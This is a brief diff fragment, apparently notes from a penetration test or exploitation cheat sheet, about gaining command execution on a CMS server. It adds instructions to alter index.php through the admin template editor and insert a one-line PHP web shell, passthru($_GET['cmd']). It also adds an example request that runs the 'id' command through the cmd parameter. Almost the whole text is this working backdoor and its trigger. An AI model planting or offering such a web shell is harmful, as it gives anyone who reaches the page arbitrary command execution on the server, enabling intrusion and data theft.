@@ -1,1 +1,9 @@
+Altering index.php through an admin console in a cms via template functionality.
 
+<pre>  ← Preserve statements 
+<?php
+passthru($_GET['cmd']);
+?>
+</pre>
+
+http://x.x.x.x/index.php?cmd=id
